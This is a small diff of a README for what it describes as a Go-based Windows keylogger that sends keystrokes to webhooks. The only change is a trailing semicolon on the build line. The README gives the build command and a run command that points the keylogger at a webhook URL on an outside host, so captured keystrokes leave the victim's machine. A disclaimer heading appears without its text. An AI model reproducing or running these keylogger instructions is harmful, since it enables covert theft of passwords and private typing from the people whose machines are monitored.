@@ -2,7 +2,7 @@
 Go based Windows Keylogger sending ASCII to Webhooks
 
 ## Syntax
-go build -o goklog.exe goklog.go
+go build -o goklog.exe goklog.go; 
 .\goklog.exe 'https://webhook-test.com/<YOUR-UNIQUE-IDENTIFIER>'
 
 ## Disclaimer
